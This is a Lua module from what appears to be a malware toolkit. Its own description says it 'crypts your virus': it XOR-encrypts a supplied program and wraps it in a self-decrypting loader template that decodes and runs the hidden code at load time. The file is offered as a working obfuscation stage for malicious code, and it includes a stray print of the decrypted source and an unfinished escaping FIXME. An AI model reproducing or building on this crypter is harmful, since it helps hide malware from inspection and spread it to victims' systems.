local utils = require ("libs.utils")
local engine = require ("libs.templates.engine")
local xorcipher = require "libs.xorcipher"

local loader = {}

loader.description =
"Crypts your virus using a xorkey (Note: this must come befor your loader to work!)"

loader.template = utils.strip ([==========[
do local xor;
if bit32 then xor=bit32.bxor else xor=load ("return function (a, b) return a ~ b end")() end
local function crypt (data, key)
local klen = #key
local s = {}
for i = 1, #data do
local k = string.byte (key, (i % klen) + 1)
local d = string.byte (data, i)
table.insert (s, string.char( xor (d, k)))
end
return table.concat (s, "")
end; local s=[==[${crypted_src}]==]
local u="local args={...}local src=table.remove(args,1);"..crypt(s,'${xorkey}')
print (u)
local f,r=load(u,'${name}','${mode}',_G)
if f then
f(src,table.unpack(args))
else
${onerror}
end
end]==========])

loader.compile = function (source, options)
  local options = options
  options.source = source
  options.name = options.name or "@bios.lua"
  options.mode = options.mode or "t"
  options.onerror = options.onerror or "error (r)"

  if not options.xorkey then
    print ("Please enter your xorkey:")
    options.xorkey = io.read ()
  end

  options.crypted_src = xorcipher.crypt (options.source, options.xorkey)

  -- FIXME: escape ]==], \f \r \n

  return engine.compile (loader.template, options)
end

return loader
